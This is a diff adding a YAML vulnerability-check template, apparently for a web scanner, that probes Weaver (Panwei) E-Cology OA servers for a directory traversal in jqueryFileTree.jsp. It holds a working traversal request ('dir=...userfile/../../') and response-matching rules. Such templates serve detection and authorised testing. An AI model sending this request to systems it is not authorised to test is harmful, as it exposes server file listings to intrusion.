@@ -1,0 +1,27 @@
+id: ecology-jqueryfiletree-traversal
+brief:
+    title: Weaver E-Cology JqueryFileTree - Directory Traversal
+    by: SleepingBag945
+    level: medium
+    about: Panwei OA E-Cology jqueryFileTree.jsp directory traversal vulnerability.
+    label:
+        - weaver
+        - ecology
+        - traversal
+        - lfr
+        - vuln
+moves:
+    - verb: GET
+      to:
+        - '{{BaseURL}}/hrm/hrm_e9/orgChart/js/jquery/plugins/jqueryFileTree/connectors/jqueryFileTree.jsp?dir=/page/resource/userfile/../../'
+      signs:
+        - "on": word
+          has:
+            - '''index.jsp'','''
+            - 重命名
+            - 新建目录
+          in: body
+          need: all
+        - "on": status
+          status:
+            - 200
